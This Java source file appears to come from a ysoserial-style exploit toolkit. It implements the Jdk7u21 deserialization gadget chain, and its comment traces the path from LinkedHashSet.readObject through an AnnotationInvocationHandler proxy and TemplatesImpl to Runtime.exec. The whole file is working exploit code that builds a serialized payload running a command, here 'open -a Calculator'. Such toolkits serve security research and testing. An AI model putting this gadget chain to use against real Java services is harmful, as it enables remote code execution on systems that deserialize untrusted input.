package com.p2hm1n.gadget;

import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.Gadgets;
import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

/**
 * Gadget chain:
 *    LinkedHashSet.readObject()
 *     LinkedHashSet.add()
 *         ...
 *         TemplatesImpl.hashCode() (X)
 *     LinkedHashSet.add()
 *         ...
 *         Proxy(Templates).hashCode() (X)
 *             AnnotationInvocationHandler.invoke() (X)
 *             AnnotationInvocationHandler.hashCodeImpl() (X)
 *                 String.hashCode() (0)
 *                 AnnotationInvocationHandler.memberValueHashCode() (X)
 *                 TemplatesImpl.hashCode() (X)
 *         Proxy(Templates).equals()
 *             AnnotationInvocationHandler.invoke()
 *             AnnotationInvocationHandler.equalsImpl()
 *                 Method.invoke()
 *                 ...
 *                     TemplatesImpl.getOutputProperties()
 *                     TemplatesImpl.newTransformer()
 *                         TemplatesImpl.getTransletInstance()
 *                         TemplatesImpl.defineTransletClasses()
 *                             ClassLoader.defineClass()
 *                             Class.newInstance()
 *                             ...
 *                                 MaliciousClass.<clinit>()
 *                                 ...
 *                                     Runtime.exec()
 */
@Dependencies()
public class Jdk7u21 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("open -a Calculator");

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object
        PayloadRunner.run(set);

    }
}
